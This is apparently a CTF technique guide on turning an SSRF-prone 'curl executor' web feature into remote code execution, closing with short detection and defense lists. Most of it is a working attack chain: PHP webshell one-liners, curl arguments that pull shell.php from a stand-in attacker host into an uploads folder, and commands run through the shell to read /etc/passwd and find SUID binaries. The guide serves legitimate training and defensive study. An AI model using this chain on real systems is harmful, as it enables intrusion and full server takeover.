# Curl Executor to Webshell

## Pattern

Some CTF web apps have a "URL fetcher" or "curl executor" that accepts a URL and fetches it using the `curl` command. This is an SSRF vulnerability that can be escalated to RCE.

## Common Implementations

### PHP curl with -o flag

```php
$cmd = "curl " . escapeshellarg($_POST['url']);
// OR - passes user input directly to curl:
$parts = explode(' ', $_POST['curl_cmd']);
// Extracts URL and -o flag from user input
```

### Exploitation

1. **Test SSRF:** `file:///etc/passwd`
2. **Test file write:** `http://YOUR_IP/file.txt -o test.txt`
3. **Path traversal:** `http://YOUR_IP/shell.php -o ../uploads/shell.php`

## Writing a PHP Webshell

Serve this from your HTTP server:

```php
<?php system($_GET['c']); ?>
```

Or use `passthru` for binary output:

```php
<?php passthru($_GET['c']); ?>
```

## Upload Methods

### Method 1: -o flag with path traversal

```
http://YOUR_IP/shell.php -o ../../uploads/shell.php
```

### Method 2: -o flag with relative path

```
http://YOUR_IP/shell.php -o uploads/shell.php
```

### Method 3: If -o is blocked, use -K (config file)

```
http://YOUR_IP/config -o -K
```

Where config contains:
```
output = "uploads/shell.php"
url = "http://YOUR_IP/shell.php"
```

## Important: No Pre-Encoding

When executing commands through the webshell:

**WRONG:**
```
# Don't pre-URL-encode commands
curl_cmd = urllib.parse.quote('http://127.0.0.1/uploads/shell.php?c=id')
```

**RIGHT:**
```
# Pass raw commands
curl_cmd = 'http://127.0.0.1/uploads/shell.php?c=id'
```

The webshell's curl executor or the web request will handle encoding. Pre-encoding causes double-encoding and commands fail.

## Full Exploitation Chain

1. **Setup HTTP server:**
   ```bash
   python3 -m http.server 8080 --directory /tmp
   echo '<?php passthru($_GET["c"]); ?>' > /tmp/shell.php
   ```

2. **Upload webshell:**
   ```
   curl_cmd: http://YOUR_IP:8080/shell.php -o uploads/shell.php
   ```

3. **Execute commands:**
   ```
   curl_cmd: http://127.0.0.1/uploads/shell.php?c=id
   ```

4. **Escalate:**
   ```
   curl_cmd: http://127.0.0.1/uploads/shell.php?c=find / -perm -4000 -type f 2>/dev/null
   curl_cmd: http://127.0.0.1/uploads/shell.php?c=cat /etc/passwd
   ```

## Detection Indicators

- Input field labeled "URL", "Fetch", "Download"
- PHP code using `curl_init()`, `curl_exec()`, or `system("curl ...")`
- Python code using `subprocess.run(["curl", ...])` or `requests.get()`
- No URL validation or only basic `http://` prefix check

## Defenses

- Validate URLs against allowlist
- Block `file://` protocol
- Don't pass user input to shell commands
- Use language-native HTTP clients instead of curl
- Sand curl with restricted filesystem access
